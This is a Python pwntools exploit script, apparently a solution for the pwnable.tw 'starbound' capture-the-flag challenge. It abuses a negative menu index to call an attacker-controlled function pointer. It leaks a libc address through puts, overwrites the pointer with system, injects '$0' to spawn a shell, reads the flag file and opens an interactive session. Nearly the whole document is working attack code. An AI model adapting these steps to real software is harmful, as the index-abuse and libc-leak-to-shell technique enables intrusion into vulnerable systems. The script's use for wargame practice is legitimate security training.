#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./starbound"
libcPath = "./libc_32.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10202

#  context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    offset = 0x3f0000 + 0xa

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath}, timeout = 2)
    else:
        io = remote(remoteAddr, remotePort, timeout = 2)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)
    offset = 0x1e000a

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def setName(name):
    io.sendlineafter("> ", "6")
    io.sendlineafter("> ", "2")
    io.sendafter(": ", name)
    io.sendlineafter("> ", "1")

if __name__ == "__main__":
    #  DEBUG([0x804A65D])
    setName(p32(elf.plt['puts']) + 'aaaaaaaaaaaa')
    io.sendlineafter("> ", "-33 ".ljust(0x18, 'b'))
    libc.address = u32(io.recvuntil('\xf7')[-4: ]) - offset
    success("libc", libc.address)
    #  DEBUG([0x8049972])
    setName(p32(libc.sym['system']) * 8)
    io.sendlineafter("> ", "     -33;$0;$0;$0;$0;")
    
    try:
        context.log_level = "debug"
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
        io.sendline("cat /home/starbound/flag")
        
    except EOFError:
        io.close()
    else:
        io.interactive()
